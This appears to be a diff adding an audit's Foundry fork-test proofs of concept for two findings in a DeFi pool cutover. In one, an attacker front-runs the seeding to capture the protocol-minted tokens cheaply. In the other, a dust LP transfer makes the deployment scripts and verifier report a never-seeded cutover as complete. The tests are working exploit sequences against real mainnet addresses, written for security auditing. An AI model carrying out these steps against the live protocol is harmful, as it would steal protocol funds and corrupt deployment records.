@@ -1,0 +1,427 @@
+diff --git a/test/audit-run44/AntimatterPoolPoC44.fork.t.sol b/test/audit-run44/AntimatterPoolPoC44.fork.t.sol
+new file mode 100644
+index 0000000..2d040b4
+--- /dev/null
++++ b/test/audit-run44/AntimatterPoolPoC44.fork.t.sol
+@@ -0,0 +1,421 @@
++// SPDX-License-Identifier: MIT
++pragma solidity ^0.8.20;
++
++// AUDIT-LOCAL (run 44, entry point antimatter-pool). Not upstream. Fork block 26303964.
++// Dedicated PoCs for antimatter-pool M-01 / M-02. Harness mirrors AntimatterPoolRun44.fork.t.sol.
++//
++// Run (M-02 drives the real node patcher via ffi, hence the audit44 profile):
++//   FOUNDRY_PROFILE=audit44 forge test --match-path test/audit-run44/AntimatterPoolPoC44.fork.t.sol -vv
++import {Test, Vm, console2} from "@forge-std/Test.sol";
++import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
++import {AntimatterPoolSeeder} from "../../src/periphery/AntimatterPoolSeeder.sol";
++import {CutoverAntimatterPoolMainnet, AntimatterPoolMainnetBase} from "../../script/CutoverAntimatterPoolMainnet.s.sol";
++import {VerifyAntimatterPoolCutover} from "../../script/VerifyAntimatterPoolCutover.s.sol";
++
++interface IPoC44Pooler {
++    function rescueERC20(address, address, uint256) external;
++}
++
++interface IPoC44Am {
++    function setApprovedMinter(address, bool) external;
++    function isApprovedMinter(address) external view returns (bool);
++    function annihilate(address stable, address recipient, uint256 amount, uint256 minPhUSDOut) external;
++}
++
++interface IPoC44Factory {
++    function createPair(address, address) external returns (address);
++    function getPair(address, address) external view returns (address);
++}
++
++interface IPoC44Pair {
++    function mint(address) external returns (uint256);
++    function getReserves() external view returns (uint112, uint112, uint32);
++    function token0() external view returns (address);
++    function totalSupply() external view returns (uint256);
++}
++
++interface IPoC44Router {
++    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256)
++        external
++        returns (uint256[] memory);
++}
++
++interface IPoC44Staker {
++    function setClaimEnabled(bool) external;
++    function claim(address) external;
++}
++
++/// The production cutover script; only the preview switch and the progress-file path are redirected.
++contract PoC44Harness is CutoverAntimatterPoolMainnet {
++    bool internal immutable preview;
++    string internal progressPath;
++
++    constructor(bool preview_, string memory progressPath_) {
++        preview = preview_;
++        progressPath = progressPath_;
++    }
++
++    function _previewModeFromEnv() internal view override returns (bool) {
++        return preview;
++    }
++
++    function _progressFile() internal view override returns (string memory) {
++        return progressPath;
++    }
++}
++
++/// The production verifier; `_bookKey` reads the SAME parser (`_bookAddress`) over a scratch copy of
++/// mainnet-addresses.ts that the real patcher has filled - i.e. exactly what `:verify` reads after the
++/// `:broadcast` tail. No zero-address override.
++contract PoC44VerifyPatchedBook is VerifyAntimatterPoolCutover {
++    string internal progressPath;
++    string internal bookPath;
++
++    constructor(string memory p, string memory b) {
++        progressPath = p;
++        bookPath = b;
++    }
++
++    function _progressFile() internal view override returns (string memory) {
++        return progressPath;
++    }
++
++    function _bookKey(string memory key) internal view override returns (address) {
++        return _bookAddress(vm.readFile(bookPath), key);
++    }
++
++    function bookKey(string memory key) external view returns (address) {
++        return _bookKey(key);
++    }
++}
++
++contract AntimatterPoolPoC44ForkTest is Test {
++    uint256 constant FORK_BLOCK = 26_303_964;
++    address constant OWNER = 0xCad1a7864a108DBFF67F4b8af71fAB0C7A86D0B6;
++    address constant SSV2 = 0xA6d3fc83C91B8319D219cEB12B46e3dfF064B58F;
++    address constant STAKER = 0xD57e5f043cB3C05be4E8138886cCEF2448a07C66;
++    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
++    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
++    address constant PREDICTED_PAIR = 0xb6da5138C761Eb7a3Ef7030212bfc9e2EAB8a4DA;
++    string constant TMP = "server/deployments/progress.antimatter-pool.1.audit44-poc-";
++    string constant SCRATCH_BOOK = "server/deployments/mainnet-addresses.audit44-poc-scratch.ts";
++    // sUSDS -> USDS at the fork block (convertToAssets(1e18)).
++    uint256 constant SUSDS_USD = 1_114_576_105_313_901_270;
++
++    // Exact arguments of the `antimatter-pool:broadcast` dry run (broadcast/.../dry-run/run-latest.json).
++    uint256 constant DRY_LP = 2_258_927_005_521_607_781_703;
++    uint256 constant DRY_MIN_PHUSD = 2_455_249_284_981_865_527_557;
++    uint256 constant DRY_MIN_SUSDS = 2_075_083_110_422_466_836_443;
++    // What tx5 produces at the fork block.
++    uint256 constant AM_MINTED = 2_457_703_431_673_592_711_190;
++    uint256 constant SUSDS_OUT = 2_077_157_261_663_097_322_856;
++
++    AntimatterPoolMainnetBase.Config c;
++    address attacker;
++    AntimatterPoolSeeder seeder;
++
++    function setUp() public {
++        string memory rpc = vm.envOr("RPC_MAINNET", string(""));
++        if (bytes(rpc).length == 0) {
++            vm.skip(true);
++            return;
++        }
++        vm.createSelectFork(rpc, FORK_BLOCK);
++        c = new CutoverAntimatterPoolMainnet().expectedConfig();
++        attacker = makeAddr("attacker");
++    }
++
++    // ------------------------------------------------------------------ helpers
++
++    function _tmp(string memory name) internal returns (string memory path) {
++        path = string.concat(TMP, name, ".json");
++        if (vm.exists(path)) vm.removeFile(path);
++    }
++
++    /// Script A step 6 opens claims; a real SSV2 staker claims AM and the attacker acquires `amt` of it.
++    function _scriptA_attackerAcquiresAM(uint256 amt) internal {
++        vm.prank(OWNER);
++        IPoC44Staker(SSV2).setClaimEnabled(true);
++        vm.prank(STAKER);
++        IPoC44Staker(SSV2).claim(DOLA);
++        vm.prank(STAKER);
++        IERC20(c.antimatter).transfer(attacker, amt);
++        assertEq(IERC20(c.antimatter).balanceOf(attacker), amt, "attacker holds real, claimed AM");
++    }
++
++    /// forge's LOCAL pass of `:broadcast` (pair absent, all steps simulated), rolled back; leaves the progress file.
++    function _localPass(string memory path) internal returns (address seederAddr) {
++        uint256 snap = vm.snapshotState();
++        PoC44Harness h = new PoC44Harness(false, path);
++        h.run();
++        seederAddr = address(h.seeder());
++        vm.revertToState(snap);
++    }
++
++    /// On-chain tx1..tx4 exactly as the dry run sends them.
++    function _tx1to4() internal {
++        vm.startPrank(OWNER);
++        seeder = new AntimatterPoolSeeder(
++            OWNER, c.phUSD, c.sUSDS, c.antimatter, c.router, c.phusdSusdsPair, c.uniPooler
++        ); // tx1
++        assertEq(seeder.lpForBps(1_000), DRY_LP, "lp slice == dry-run arg");
++        IPoC44Pooler(c.uniPooler).rescueERC20(c.phusdSusdsPair, OWNER, DRY_LP); // tx2
++        IERC20(c.phusdSusdsPair).approve(address(seeder), DRY_LP); // tx3
++        IPoC44Am(c.antimatter).setApprovedMinter(address(seeder), true); // tx4
++        vm.stopPrank();
++    }
++
++    function _attackerCreatesPair(uint256 amIn, uint256 susdsIn) internal returns (address pair, uint256 atkLp) {
++        vm.startPrank(attacker);
++        pair = IPoC44Factory(c.factory).createPair(c.antimatter, c.sUSDS);
++        IERC20(c.antimatter).transfer(pair, amIn);
++        IERC20(c.sUSDS).transfer(pair, susdsIn);
++        atkLp = IPoC44Pair(pair).mint(attacker);
++        vm.stopPrank();
++    }
++
++    function _reserves(address pair) internal view returns (uint256 rAm, uint256 rS) {
++        (uint112 r0, uint112 r1,) = IPoC44Pair(pair).getReserves();
++        (rAm, rS) = IPoC44Pair(pair).token0() == c.antimatter ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
++    }
++
++    function _swap(address from, address tokenIn, address tokenOut, uint256 amtIn) internal returns (uint256 out) {
++        address[] memory path = new address[](2);
++        path[0] = tokenIn;
++        path[1] = tokenOut;
++        vm.startPrank(from);
++        IERC20(tokenIn).approve(c.router, amtIn);
++        out = IPoC44Router(c.router).swapExactTokensForTokens(amtIn, 0, path, from, block.timestamp)[1];
++        vm.stopPrank();
++    }
++
++    /// annihilate `amt` AM (floored to USDC precision) with USDC; attacker pays the USDC.
++    function _annihilate(address who, uint256 amt) internal returns (uint256 phOut, uint256 usdcIn) {
++        uint256 amUsed = amt / 1e12 * 1e12;
++        usdcIn = amUsed / 1e12;
++        deal(USDC, who, IERC20(USDC).balanceOf(who) + usdcIn);
++        uint256 ph0 = IERC20(c.phUSD).balanceOf(who);
++        vm.startPrank(who);
++        IERC20(USDC).approve(c.antimatter, usdcIn);
++        IPoC44Am(c.antimatter).annihilate(USDC, who, amUsed, 0);
++        vm.stopPrank();
++        phOut = IERC20(c.phUSD).balanceOf(who) - ph0;
++    }
++
++    function _usd(uint256 susds) internal pure returns (uint256) {
++        return susds * SUSDS_USD / 1e18;
++    }
++
++    // ================================================================== M-01
++
++    /// M-01: after tx1 reveals the seeder, an AM holder pre-creates the AM/sUSDS pair AM-cheap; tx5 (identical args)
++    /// does NOT revert and pours all 2,457.70 protocol-minted AM into it against 2.46e-9 sUSDS; the attacker buys it.
++    function test_PoC_M01_frontRunStealsSeededAM() public {
++        // Precondition: Script A has run (claims open); attacker holds 1 real AM from a claimant.
++        _scriptA_attackerAcquiresAM(1e18);
++
++        // forge local pass (Step 0 sees no pair) -> predicts the seeder; then tx1..tx4 land one per receipt.
++        string memory path = _tmp("m01");
++        address predicted = _localPass(path);
++        _tx1to4();
++        assertEq(address(seeder), predicted, "tx1 seeder == local-pass prediction (public, predictable)");
++        vm.removeFile(path);
++
++        // Attacker, between tx4 and tx5: create the pair at 1 AM : 1e-12 sUSDS.
++        deal(c.sUSDS, attacker, 1_000e18);
++        uint256 atkS0 = IERC20(c.sUSDS).balanceOf(attacker);
++        (address pair,) = _attackerCreatesPair(1e18, 1e6);
++        assertEq(pair, PREDICTED_PAIR, "attacker created the canonical AM/sUSDS pair");
++
++        // tx5 with the dry-run's exact arguments - succeeds.
++        uint256 ownerS0 = IERC20(c.sUSDS).balanceOf(OWNER);
++        vm.prank(OWNER);
++        (uint256 am, uint256 liq) =
++            seeder.seed(DRY_LP, DRY_MIN_PHUSD, DRY_MIN_SUSDS, OWNER, block.timestamp + 1 hours);
++        // tx6
++        vm.prank(OWNER);
++        IPoC44Am(c.antimatter).setApprovedMinter(address(seeder), false);
++        assertFalse(IPoC44Am(c.antimatter).isApprovedMinter(address(seeder)), "tx6 revoke landed");
++
++        (uint256 rAm, uint256 rS) = _reserves(pair);
++        uint256 returned = IERC20(c.sUSDS).balanceOf(OWNER) - ownerS0;
++        console2.log("M01 AM minted (all deposited)       ", am);
++        console2.log("M01 pair AM reserve                 ", rAm);
++        console2.log("M01 pair sUSDS reserve (wei)        ", rS);
++        console2.log("M01 sUSDS returned to OWNER         ", returned);
++        console2.log("M01 OWNER AM/sUSDS LP               ", liq);
++        assertEq(am, AM_MINTED, "AM minted");
++        assertEq(rAm, AM_MINTED + 1e18, "every protocol AM unit is in the attacker's pair");
++        assertEq(rS, 2_458_703_431, "pair sUSDS reserve = 2.46e-9 sUSDS");
++        assertEq(returned, 2_077_157_261_660_639_619_425, "OWNER got the sUSDS back - AM paired with ~nothing");
++        assertEq(returned, SUSDS_OUT - (AM_MINTED * 1e6 / 1e18), "only am*rS/rA sUSDS paired");
++
++        // Attacker buys the AM for dust.
++        uint256 amOut = _swap(attacker, c.sUSDS, c.antimatter, 1e12);
++        console2.log("M01 AM bought for 1e12 wei sUSDS    ", amOut);
++        assertGe(amOut, 2_452e18, ">= 2452 AM for 1e-6 sUSDS");
++
++        // Protocol's LP is now worth ~6.05 AM + ~1e-6 sUSDS.
++        (uint256 rAm2, uint256 rS2) = _reserves(pair);
++        uint256 ts = IPoC44Pair(pair).totalSupply();
++        uint256 ownerAm = rAm2 * liq / ts;
++        uint256 ownerS = rS2 * liq / ts;
++        console2.log("M01 OWNER LP redeemable AM          ", ownerAm);
++        console2.log("M01 OWNER LP redeemable sUSDS (wei) ", ownerS);
++        assertApproxEqAbs(ownerAm, 6.05e18, 0.01e18, "OWNER LP ~ 6.05 AM");
++        assertApproxEqRel(ownerS, 1e12, 0.01e18, "OWNER LP ~ 1e-6 sUSDS");
++
++        // Realize: annihilate with USDC, sell all phUSD into phUSD/sUSDS.
++        (uint256 phOut, uint256 usdcIn) = _annihilate(attacker, amOut);
++        uint256 sOut = _swap(attacker, c.phUSD, c.sUSDS, phOut);
++        uint256 atkS1 = IERC20(c.sUSDS).balanceOf(attacker);
++        // P&L (USD 1e18): sUSDS delta - USDC spent - the 1 AM seed valued at a conservative $1.
++        int256 pnl = int256(_usd(atkS1)) - int256(_usd(atkS0)) - int256(usdcIn * 1e12) - 1e18;
++        console2.log("M01 USDC spent (6dp)                ", usdcIn);
++        console2.log("M01 phUSD from annihilate           ", phOut);
++        console2.log("M01 sUSDS from phUSD sale           ", sOut);
++        console2.log("M01 attacker realized P&L USD (1e18)");
++        console2.logInt(pnl);
++        assertGe(pnl, 1_300e18, "attacker realized >= +$1,300");
++    }
++
++    /// Control: identical sequence with Script A NOT run - AM totalSupply is 0, nobody can pre-price the pair,
++    /// and tx5 pairs the AM with the full sUSDS.
++    function test_PoC_M01_control_noScriptA_cannotReproduce() public {
++        assertEq(IERC20(c.antimatter).totalSupply(), 0, "pre-A: AM supply is 0");
++        string memory path = _tmp("m01ctl");
++        address predicted = _localPass(path);
++        _tx1to4();
++        assertEq(address(seeder), predicted);
++        vm.removeFile(path);
++
++        deal(c.sUSDS, attacker, 1_000e18);
++        // Same attacker step: createPair succeeds, but there is no AM to price it with.
++        vm.startPrank(attacker);
++        address pair = IPoC44Factory(c.factory).createPair(c.antimatter, c.sUSDS);
++        vm.expectRevert();
++        IERC20(c.antimatter).transfer(pair, 1e18);
++        IERC20(c.sUSDS).transfer(pair, 1e6);
++        vm.expectRevert(); // UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED (one-sided)
++        IPoC44Pair(pair).mint(attacker);
++        vm.stopPrank();
++
++        uint256 ownerS0 = IERC20(c.sUSDS).balanceOf(OWNER);
++        vm.prank(OWNER);
++        (uint256 am, uint256 liq) =
++            seeder.seed(DRY_LP, DRY_MIN_PHUSD, DRY_MIN_SUSDS, OWNER, block.timestamp + 1 hours);
++        vm.prank(OWNER);
++        IPoC44Am(c.antimatter).setApprovedMinter(address(seeder), false);
++        (uint256 rAm, uint256 rS) = _reserves(pair);
++        console2.log("CTL pair AM reserve   ", rAm);
++        console2.log("CTL pair sUSDS reserve", rS);
++        assertEq(am, AM_MINTED);
++        assertEq(rAm, AM_MINTED, "pair holds exactly the protocol AM");
++        assertEq(rS, SUSDS_OUT + 1e6, "full sUSDS paired (+ the attacker's 1e6 wei donation, absorbed)");
++        assertEq(IERC20(c.sUSDS).balanceOf(OWNER), ownerS0, "nothing returned: AM priced at the seed ratio");
++        assertEq(IPoC44Pair(pair).totalSupply(), liq + 1000, "OWNER owns the pool");
++        uint256 amOut = _swap(attacker, c.sUSDS, c.antimatter, 1e12);
++        console2.log("CTL AM bought for 1e12 wei sUSDS", amOut);
++        assertLt(amOut, 1e13, "1e-6 sUSDS buys ~1e-6 AM, not the pool");
++    }
++
++    // ================================================================== M-02
++
++    /// M-02: attacker pre-prices the pair AM-dear -> tx5 reverts, revoke never sent; resume #1 aborts; 1 wei of LP
++    /// to OWNER makes resume #2 "complete" with only the revoke; the real patcher FILLs the attacker's pair into the
++    /// book and the real verifier (no override) passes on a never-seeded cutover.
++    function test_PoC_M02_dustLpSpoofsCompletedCutover() public {
++        if (keccak256(bytes(vm.envOr("FOUNDRY_PROFILE", string("")))) != keccak256("audit44")) {
++            console2.log("SKIP: needs FOUNDRY_PROFILE=audit44 (ffi for the real node patcher)");
++            vm.skip(true);
++            return;
++        }
++        _scriptA_attackerAcquiresAM(1e18);
++
++        string memory path = _tmp("m02");
++        address predicted = _localPass(path); // forge local pass: writes completed / seeded=true before any tx lands
++        string memory j = vm.readFile(path);
++        assertEq(vm.parseJsonString(j, ".deploymentStatus"), "completed");
++        assertTrue(vm.parseJsonBool(j, ".cutover.seeded"), "local pass recorded seeded=true");
++
++        _tx1to4();
++        assertEq(address(seeder), predicted, "tx1 seeder == local-pass prediction");
++
++        // Attacker: AM-dear pre-pricing, 1 AM : 10 sUSDS.
++        deal(c.sUSDS, attacker, 100e18);
++        (address pair,) = _attackerCreatesPair(1e18, 10e18);
++        assertEq(pair, PREDICTED_PAIR);
++
++        // tx5 reverts with the exact error; forge --slow stops, tx6 (revoke) is never sent.
++        vm.prank(OWNER);
++        vm.expectRevert(
++            abi.encodeWithSelector(
++                AntimatterPoolSeeder.AntimatterNotFullyConsumed.selector,
++                AM_MINTED,
++                24_577_034_316_735_927_111_900,
++                SUSDS_OUT
++            )
++        );
++        seeder.seed(DRY_LP, DRY_MIN_PHUSD, DRY_MIN_SUSDS, OWNER, block.timestamp + 1 hours);
++        assertTrue(IPoC44Am(c.antimatter).isApprovedMinter(address(seeder)), "dangling minter grant");
++
++        // Resume #1 (runbook: re-run :broadcast) - the real script aborts at Step 0.
++        PoC44Harness r1 = new PoC44Harness(false, path);
++        vm.expectRevert(
++            bytes(
++                "Step 0: the AM/sUSDS pair ALREADY EXISTS and this cutover did not create it - ABORT (griefing risk R1, story 113). Do not seed into a pair someone else created; investigate first."
++            )
++        );
++        r1.run();
++
++        // Attacker sends 1 wei of its LP to OWNER.
++        vm.prank(attacker);
++        IERC20(pair).transfer(OWNER, 1);
++
++        // Resume #2 - the real script "completes" with only the revoke.
++        uint256 amSupply = IERC20(c.antimatter).totalSupply();
++        PoC44Harness r2 = new PoC44Harness(false, path);
++        r2.run();
++        assertEq(r2.txCount(), 1, "only the revoke was sent");
++        assertFalse(r2.seededThisRun(), "no seed");
++        assertFalse(IPoC44Am(c.antimatter).isApprovedMinter(address(seeder)), "revoked");
++        assertEq(IERC20(c.phusdSusdsPair).balanceOf(OWNER), DRY_LP, "slice sits on OWNER, never converted");
++        assertEq(IERC20(c.antimatter).totalSupply(), amSupply, "cutover minted no AM");
++        assertEq(IERC20(pair).balanceOf(OWNER), 1, "OWNER's 'AM/sUSDS LP' is the attacker's 1 wei");
++        j = vm.readFile(path);
++        assertEq(vm.parseJsonString(j, ".deploymentStatus"), "completed", "progress: completed");
++        assertTrue(vm.parseJsonBool(j, ".cutover.seeded"), "progress: seeded=true");
++        assertEq(vm.parseJsonUint(j, ".cutover.amMinted"), AM_MINTED, "progress: phantom amMinted");
++        assertEq(vm.parseJsonAddress(j, ".contracts.AntimatterSusdsPair.address"), pair, "progress: attacker pair");
++        console2.log("M02 progress status / seeded:", vm.parseJsonString(j, ".deploymentStatus"), "true");
++        console2.log("M02 OWNER phUSD/sUSDS LP (unconverted)", IERC20(c.phusdSusdsPair).balanceOf(OWNER));
++
++        // :broadcast tail #1 - the REAL patcher on a scratch copy of the address book.
++        if (vm.exists(SCRATCH_BOOK)) vm.removeFile(SCRATCH_BOOK);
++        vm.copyFile("server/deployments/mainnet-addresses.ts", SCRATCH_BOOK);
++        string[] memory cmd = new string[](6);
++        cmd[0] = "node";
++        cmd[1] = "scripts/patch-mainnet-addresses-antimatter-pool.js";
++        cmd[2] = "--progress";
++        cmd[3] = path;
++        cmd[4] = "--addresses";
++        cmd[5] = SCRATCH_BOOK;
++        Vm.FfiResult memory res = vm.tryFfi(cmd);
++        console2.log(string(res.stdout));
++        assertEq(res.exitCode, 0, "patcher exit 0");
++        assertTrue(
++            vm.contains(string(res.stdout), "FILL     AntimatterSusdsPair <- 0xb6da5138C761Eb7a3Ef7030212bfc9e2EAB8a4DA"),
++            "patcher FILLs the attacker's pair"
++        );
++
++        // :broadcast tail #2 - the REAL verifier reading the patched book (no zero-address override): PASSES.
++        PoC44VerifyPatchedBook v = new PoC44VerifyPatchedBook(path, SCRATCH_BOOK);
++        assertEq(v.bookKey("AntimatterSusdsPair"), pair, "book now names the attacker's pair");
++        assertEq(v.bookKey("AntimatterPoolSeeder"), address(seeder), "book names the seeder");
++        v.run();
++        console2.log("M02 VerifyAntimatterPoolCutover PASSED on a never-seeded cutover");
++
++        vm.removeFile(SCRATCH_BOOK);
++        vm.removeFile(path);
++    }
++}
